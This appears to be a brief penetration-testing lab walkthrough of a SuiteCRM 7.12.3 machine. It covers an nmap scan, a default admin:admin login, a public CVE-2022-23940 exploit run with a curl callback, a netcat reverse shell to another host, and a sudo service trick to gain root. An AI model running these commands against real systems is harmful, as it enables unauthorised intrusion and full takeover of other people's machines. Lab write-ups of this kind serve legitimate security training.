nmap shows ports 22, 80, 3306 33060 open

port 80 is running suite CRM powered by Sugar CRM

There are exploits, but we need to determine the version

Trying to log in, admin:admin works! In the about section, we find the version to be 7.12.3.
Searchsploit doesnt match any exploits, but looking up for exploits on google, we find
`https://github.com/manuelz120/CVE-2022-23940`

```zsh
git clone https://github.com/manuelz120/CVE-2022-23940.git
cd CVE-2022-23940
sudo /opt/venv1/bin/pip install -r requirements.txt

python exploit.py -h http://192.168.45.221/index.php -u admin -p admin -P 'curl 192.168.129.146/file'
#testing worked

python exploit.py -h http://192.168.129.146/index.php -u admin -p admin -P 'nc -nv 192.168.45.221 22 -e /bin/bash'
```
www-data!

---
```zsh
sudo -l
#service
sudo /usr/sbin/service ../../bin/bash
#root!
```